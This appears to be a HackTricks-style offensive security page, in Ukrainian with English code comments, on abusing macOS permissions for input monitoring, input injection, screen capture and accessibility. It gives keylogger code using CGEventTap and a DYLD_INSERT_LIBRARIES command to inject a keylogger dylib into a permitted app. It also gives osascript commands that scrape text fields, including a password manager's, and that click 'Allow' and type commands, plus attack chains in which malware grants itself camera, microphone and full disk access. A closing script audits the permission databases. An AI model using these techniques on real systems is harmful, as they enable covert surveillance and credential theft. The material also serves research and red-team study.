# Зловживання Input Monitoring, Screen Capture та Accessibility у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Три пов’язані служби TCC контролюють, як застосунки можуть спостерігати за сеансом користувача на робочому столі та взаємодіяти з ним:

| Служба TCC | Дозвіл | Можливості |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Читання всіх подій клавіатури та миші в системі (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Ін’єкція синтетичних подій клавіатури та миші |
| `kTCCServiceScreenCapture` | **Screen Capture** | Читання буфера дисплея, створення знімків екрана, запис екрана |
| `kTCCServiceAccessibility` | **Accessibility** | Керування іншими застосунками через API AXUIElement, читання елементів інтерфейсу |

Ці дозволи є **найнебезпечнішим поєднанням у macOS** — разом вони забезпечують:
- Повний keylogging кожного натискання клавіш (паролі, повідомлення, дані кредитних карток)
- Запис усього видимого вмісту з екрана
- Ін’єкцію синтетичного введення (натискання кнопок, підтвердження діалогових вікон)
- Повний контроль GUI, еквівалентний фізичному доступу

---

## Input Monitoring (kTCCServiceListenEvent)

### Як це працює

macOS використовує **API `CGEventTap`**, щоб дозволити процесам перехоплювати події введення із системи подій Quartz. Процес із дозволом ListenEvent може створити event tap, який отримує **кожну подію клавіатури та миші** до або після її надходження до цільового застосунку.<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Пошук бінарних файлів з entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Атака: Keylogging через ін’єкцію коду

Якщо бінарний файл із дозволом ListenEvent також має **вимкнену перевірку бібліотек** або **дозволяє змінні середовища DYLD**, зловмисник може ін’єктувати dylib, яка реєструє CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Інжектована dylib успадковує дозвіл ListenEvent TCC цільового процесу та захоплює всі натискання клавіш.

### Атака: викрадення облікових даних

Складний keylogger може пов’язувати натискання клавіш з активним застосунком:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Ін’єкція вводу (kTCCServicePostEvent)

### Як це працює

Дозвіл PostEvent дає змогу створювати перехоплювач подій із **`kCGEventTapOptionDefault`** (може змінювати/вставляти події) замість ListenOnly.<sup>[1]</sup> Це дає змогу:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Атака: автоматичне схвалення запитів TCC

За допомогою PostEvent зловмисник може **імітувати натискання «Дозволити»** у діалогових вікнах дозволів TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Захоплення екрана (kTCCServiceScreenCapture)

### Як це працює

Дозвіл на захоплення екрана дає змогу читати буфер дисплея за допомогою:
- **`CGWindowListCreateImage`** — захоплення будь-якого вікна або всього екрана
- **`ScreenCaptureKit`** (macOS 12.3+) — сучасний API для потокової передачі вмісту екрана<sup>[3]</sup>
- **`CGDisplayStream`** — апаратно прискорене захоплення екрана
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Пошук клієнтів захоплення екрана
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Перехоплення облікових даних через OCR

Інжектований процес захоплення екрана може періодично захоплювати кадри та використовувати OCR для вилучення паролів:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Починаючи з **macOS Sonoma**, захоплення екрана відображає **постійний індикатор** у рядку меню. У старіших версіях запис екрана міг виконуватися повністю непомітно. Однак коротке захоплення одного кадру все ще може залишитися непоміченим користувачами.

### Атака: Session Recording

Безперервний запис екрана забезпечує повне відтворення сеансу користувача:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Доступність (kTCCServiceAccessibility)

### Як це працює

Доступ до функцій доступності надає контроль над іншими застосунками через **AXUIElement API**.<sup>[2]</sup> Процес із доступом до функцій доступності може:

1. **Читати** будь-який елемент інтерфейсу в будь-якому застосунку (текстові поля, мітки, кнопки, меню)
2. **Натискати** кнопки та взаємодіяти з елементами керування
3. **Вводити** текст у будь-яке текстове поле
4. **Переміщатися** меню та діалоговими вікнами
5. **Збирати** дані, що відображаються в будь-якому запущеному застосунку
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Атака: самостійне надання дозволів TCC

Найнебезпечніше зловживання accessibility — **навігація в System Settings для надання власному malware додаткових дозволів**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Атака: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Атака: автоматизовані дії користувача
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Ланцюги атак

### Ланцюг: Input Monitoring + Screen Capture = Повне стеження
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Ланцюжок: Accessibility + PostEvent = Повний віддалений контроль
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Ланцюжок: Спеціальні можливості → Self-Grant доступу до камери/мікрофона → Спостереження
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Виявлення та перерахування
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Посилання

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Зловживання Accessibility як обхід TCC](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
